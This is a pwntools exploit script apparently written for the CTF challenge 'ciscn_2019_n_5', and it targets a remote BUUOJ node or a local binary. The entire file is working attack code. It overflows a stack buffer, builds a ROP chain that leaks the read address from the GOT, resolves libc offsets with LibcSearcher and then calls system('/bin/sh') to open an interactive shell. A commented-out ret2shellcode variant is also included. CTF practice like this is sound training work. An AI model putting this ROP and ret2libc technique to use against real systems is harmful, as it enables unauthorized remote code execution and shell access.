from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(arch='amd64', os='linux', log_level = 'DEBUG')
binary = './ciscn_2019_n_5'
elf = ELF(binary)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = remote('node3.buuoj.cn',27225) if argv[1]=='r' else process(binary)

# start
sla('name\n', 'merc')
pop_rdi = 0x400713
payload = flat('a'*0x28,pop_rdi,elf.got['read'],elf.plt['puts'],elf.sym['main'])
ru('me?\n')
sl(payload)
read = uu64(r(6))
leak('read',read)
sla('name\n', 'merc')
system, binsh = ret2libc(read,'read')
payload = flat('a'*0x28,pop_rdi,binsh,system,'a'*8)
sla('me?\n', payload)
# end

# OR ret2shellcode
# start
# sla('name\n', asm(shellcraft.sh()))
# payload = flat('a'*0x28,0x601080)
# ru('me?\n')
# sl(payload)
# end

itr()